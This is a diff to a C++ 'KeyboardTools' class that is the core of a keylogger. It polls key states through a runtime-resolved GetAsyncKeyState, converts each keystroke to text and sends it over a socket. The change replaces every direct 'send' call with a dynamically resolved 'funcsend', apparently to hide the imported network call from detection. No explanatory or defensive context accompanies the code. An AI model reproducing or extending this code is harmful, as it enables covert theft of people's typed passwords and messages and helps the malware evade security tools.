@@ -60,34 +60,34 @@ class KeyboardTools{
 					if (funcGetAsyncKeyState(key)==-32767){
 						switch(key){
 							case 0x0d:
-								send (outputFd, "\r\n", 2, 0);
+								funcsend (outputFd, "\r\n", 2, 0);
 								break;
 							case 0xdc:
-								send (outputFd, "\\", 1, 0);
+								funcsend (outputFd, "\\", 1, 0);
 								break;
 							case 0x25:
-								send (outputFd, "<Left Arrow>", 12, 0);
+								funcsend (outputFd, "<Left Arrow>", 12, 0);
 								break;
 							case 0x26:
-								send (outputFd, "<Up Arrow>", 10, 0);
+								funcsend (outputFd, "<Up Arrow>", 10, 0);
 								break;
 							case 0x27:
-								send (outputFd, "<Right Arrow>", 13, 0);
+								funcsend (outputFd, "<Right Arrow>", 13, 0);
 								break;
 							case 0x28:
-								send(outputFd, "<Bottom Arrow>", 14, 0);
+								funcsend(outputFd, "<Bottom Arrow>", 14, 0);
 								break;
 							case 0x10:
 								break;
 							case 0xbe:
-								send(outputFd, ".", 1, 0);
+								funcsend(outputFd, ".", 1, 0);
 								break;
 							case 0xbc:
-								send(outputFd, ",", 1, 0);
+								funcsend(outputFd, ",", 1, 0);
 								break;
 							default:
 							if (key>64&&key<92&&!(funcGetAsyncKeyState(0x10)))key+=32;
-								send(outputFd,(const char*) &key, 1, 0);
+								funcsend(outputFd,(const char*) &key, 1, 0);
 						}
 					}
 				}
